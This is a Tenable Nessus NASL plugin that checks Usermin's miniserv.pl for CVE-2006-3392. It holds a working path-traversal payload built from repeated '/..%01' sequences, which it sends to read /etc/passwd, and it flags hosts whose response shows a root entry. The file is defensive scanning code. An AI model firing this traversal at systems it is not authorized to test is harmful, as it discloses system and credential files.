#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(77704);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_cve_id("CVE-2006-3392");
  script_bugtraq_id(18744);
  script_osvdb_id(26772);

  script_name(english:"Usermin 'miniserv.pl' Arbitrary File Disclosure");
  script_summary(english:"Attempts to read a local file using miniserv.pl.");

  script_set_attribute(attribute:"synopsis", value:"The remote web server is affected by an information disclosure flaw.");
  script_set_attribute(attribute:"description", value:
"The Usermin install on the remote host is affected by an information
disclosure flaw in the Perl script 'miniserv.pl'. This flaw could
allow a remote, unauthenticated attacker to read arbitrary files on
the affected host, subject to the privileges of the web server user
id.");
  script_set_attribute(attribute:"see_also", value:"http://www.webmin.com/uchanges.html");
  script_set_attribute(attribute:"solution", value:"Upgrade Usermin 1.220 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
script_set_attribute(attribute:"vuln_publication_date", value:"2006/06/29");
  script_set_attribute(attribute:"patch_publication_date", value:"2006/06/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2014/09/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:webmin:usermin");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:usermin:usermin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2014-2015 Tenable Network Security, Inc.");

  script_dependencies("usermin_detect.nbin");
  script_require_keys("www/usermin");
  script_require_ports("Services/www", 20000);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

app = "Usermin";
port = get_http_port(default:20000, embedded: TRUE);
get_kb_item_or_exit('www/'+port+'/usermin');

dir = '/';
install_url = build_url(port:port, qs:dir);

# Try to exploit the flaw to read a local file.
file = "/etc/passwd";
exploit = "unauthenticated" + crap(data:"/..%01", length:60) + file;

res = http_send_recv3(
  method : "GET",
  port   : port,
  item   : dir + exploit,
  exit_on_fail : TRUE
);

# There's a problem if there's an entry for root.
if (egrep(pattern:"root:.*:0:[01]:", string:res[2]))
{
  if (report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to exploit this issue with the following URL : ' +
      '\n' + install_url + exploit + '\n';
    if (report_verbosity > 1)
    {
      if (
        !defined_func("nasl_level") ||
        nasl_level() < 5200 ||
        !isnull(get_preference("sc_version"))
      )
      {
        report +=
          '\n' + 'This produced the following truncated output :' +
          '\n' + snip +
          '\n' + beginning_of_response(resp:res[2], max_lines:'10') +
          '\n' + snip +
          '\n';
        security_warning(port:port, extra:report);
      }
      else
      {
        # Sanitize file names
        if ("/" >< file) file = ereg_replace(
          pattern:"^.+/([^/]+)$", replace:"\1", string:file);
        report +=
          '\n' + 'Attached is a copy of the response' + '\n';
        attachments = make_list();
        attachments[0] = make_array();
        attachments[0]["type"] = "text/plain";
        attachments[0]["name"] = file;
        attachments[0]["value"] = chomp(res[2]);
        security_report_with_attachments(
          port  : port,
          level : 2,
          extra : report,
          attachments : attachments
        );
      }
    }
    else security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
audit(AUDIT_WEB_APP_NOT_AFFECTED, app, install_url);
